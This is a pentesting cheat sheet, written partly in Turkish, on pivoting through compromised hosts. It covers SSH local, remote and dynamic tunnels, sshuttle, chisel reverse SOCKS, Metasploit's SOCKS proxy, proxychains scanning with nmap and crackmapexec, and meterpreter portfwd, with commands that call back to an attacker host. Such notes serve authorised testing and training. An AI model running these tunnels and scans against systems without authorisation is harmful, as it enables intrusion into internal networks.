# Port Forwarding / SSH Tunneling

## SSH

<pre><code># RDP'yi dahili ana bilgisayardan 1337 numaralı portunu saldırı makinesine iletin.
ssh -L &#x3C;LocalHost>:&#x3C;Port>:&#x3C;IP-To-Forward-From>:&#x3C;Port> &#x3C;User>@&#x3C;IP>
ssh -L 127.0.0.1:1337:10.200.48.150:3389 root@10.200.48.200 -i id_rsa

# Uzak bağlantı noktası 80'i yerel bağlantı noktası 80'e yönlendirme.
# Listen on local port 8080 and forward incoming traffic to REMOT_HOST:PORT via SSH_SERVER
# Scenario: access a host that's being blocked by a firewall via SSH_SERVER;
<strong>ssh atena@10.10.72.69 -L 80:127.0.0.1:80
</strong>ssh &#x3C;User>@&#x3C;IP> -L &#x3C;Local-Port>127.0.0.1&#x3C;Remote-Port>
ssh -L 127.0.0.1:8080:REMOTE_HOST:PORT user@SSH_SERVER

# Dynamic SSH Port Forwarding
# Listen on local port 8080. Incoming traffic to 127.0.0.1:8080 forwards it to final destination via SSH_SERVER
# Scenario: proxy your web traffic through SSH tunnel OR access hosts on internal network via a compromised DMZ box;
ssh -i &#x3C;id_rsa> &#x3C;User>@&#x3C;IP> -D &#x3C;Proxychains-Port>
ssh -i id_rsa errorcauser@10.10.254.201 -D 1080
ssh -D 127.0.0.1:8080 user@SSH_SERVER</code></pre>

#### SSH: Remote Port Forwarding

```
# Open port 5555 on SSH_SERVER. Incoming traffic to SSH_SERVER:5555 is tunneled to LOCALHOST:3389
# Scenario: expose RDP on non-routable network;
ssh -R 5555:LOCAL_HOST:3389 user@SSH_SERVER
plink -R ATTACKER:ATTACKER_PORT:127.0.01:80 -l root -pw pw ATTACKER_IP
```

## Shuttle

```
# Şifre ile kimlik doğrulama.
sshuttle -r <User>@<Target-IP> <Target-Subnet> -x <Target-IP>
sshuttle -r user@172.16.0.5 172.16.0.0/24 -x 172.16.0.5

# Anahtarla kimlik doğrulaması yapma.
sshuttle -r <User>@<IP> --ssh-cmd "<Command>" <Target Subnet> -x <Exclude IP>
sshuttle -r root@10.200.48.200 --ssh-cmd "ssh -i id_rsa" 10.200.48.0/24 -x 10.200.48.200
```

## Chisel

```
# Attacking Machine
./chisel server -p <Port> --reverse &
./chisel server -p 1337 --reverse &

# On Target Machine
./chisel client <Attacking-IP>:<Port> R:socks &
./chisel client 10.50.46.8:1337 R:socks &

# Ardından, güvenliği ihlal edilmiş ana bilgisayardan dahili ağları taramak için Proxchains' kullanın.
# Then use Proxychains to scan internal networks from the compromised host.
```

## Metasploit with Proxychains

/etc/proxychains4.conf içindeki son satırı şu değerle değiştirin: socks5 127.0.0.1 1080

Ardından aşağıdaki Metasploit modülünü kullanın:

Modül seçeneklerini aşağıdaki gibi ayarlayın (Default):

```
Module options (auxiliary/server/socks_proxy):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD                   no        Proxy password for SOCKS5 listener
   SRVHOST   0.0.0.0          yes       The address to listen on
   SRVPORT   1080             yes       The port to listen on
   USERNAME                   no        Proxy username for SOCKS5 listener
   VERSION   5                yes       The SOCKS version to use (Accepted: 4a, 5)
```

Ardınan, önce proxycains komutuyla komutlar başlatarak uygulamaları proxychains kullanmaya zorlayabilirisniz.

```
proxychains nmap <IP> -sT -p 1-10000 -sV -v
proxychains crackmapexec smb 10.10.10.100.5 -u '' -p ''
proxychains ssh <user>@<IP>
proxychains telnet <IP>
```

### Double Pivot

```
# /etc/proxychains.conf
# Ensure dynamic_chain is uncommented

dynamic_chain
proxy_dns 
tcp_read_time_out 15000
tcp_connect_time_out 8000
socks5  127.0.0.1 1080  # First Pivot
socks5  127.0.0.1 1081  # Second Pivot
```

## Port Forward

Meterpreter, dosya paylaşımlarına ve web sunucularına erişim için ileriye dönük olarak kullanılabilir.

```
portfwd add -l <LocalPort> -p <RemotePort> -r <TargetIP>
portfwd add -l 3333 -p 3389 -r 10.10.10.5
```

Esasen yukarıdaki örnek komuta göre, uzak bağlantı noktasına ulaşmak için yerel bağlantı noktamızdaki RDP'ye bağlanabiliriz.

```
rdesktop 127.0.0.1:3333
```

### Proxy Tunnel

```
# Open a local port 127.0.0.1:5555. Incoming traffic to 5555 is proxied to DESTINATION_HOST through PROXY_HOST:3128
# Scenario: a remote host has SSH running, but it's only bound to 127.0.0.1, but you want to reach it;
proxytunnel -p PROXY_HOST:3128 -d DESTINATION_HOST:22 -a 5555
ssh user@127.0.0.1 -p 5555
```

## xFreeRDP

Doğrudan bir pivoting tekniği olmasa da, ana bilgisayarın dosya sistemini paylaşmak için xFreeRDP'yi kullanmak, saldırgana, pivot işlemine daha fazla yardımcı olmak için dosyaları sistemler arasında taşımak için kolay bir yol sağlayabilir.



```bash
xfreerdp /v:IP /u:USERNAME /p:PASSWORD +clipboard /dynamic-resolution /drive:/usr/share/windows-resources,share
```

##
